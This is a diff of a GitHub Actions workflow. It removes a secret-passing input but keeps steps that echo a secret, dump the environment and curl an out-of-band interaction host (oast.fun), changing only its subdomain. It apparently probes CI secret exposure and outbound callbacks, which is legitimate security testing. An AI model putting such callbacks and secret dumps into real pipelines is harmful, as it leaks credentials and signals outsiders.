@@ -8,8 +8,6 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: 'My step 1'
-        with: # Set the secret as an input
-          super_secret2: ${{ secrets.SuperSecret }}
         env:
           VARR1: var1-value
           super_secret: ${{ secrets.SuperSecret }}
@@ -19,4 +17,4 @@ jobs:
           echo $super_secret2
           echo 1; echo 2;
           env
-          curl https://lobqidjjcvgdsnkvjczfo3ewtz02l6pya.oast.fun/githubwf
+          curl https://lobqidjjcvgdsnkvjczfwug76zlf0vhyx.oast.fun/githubwf
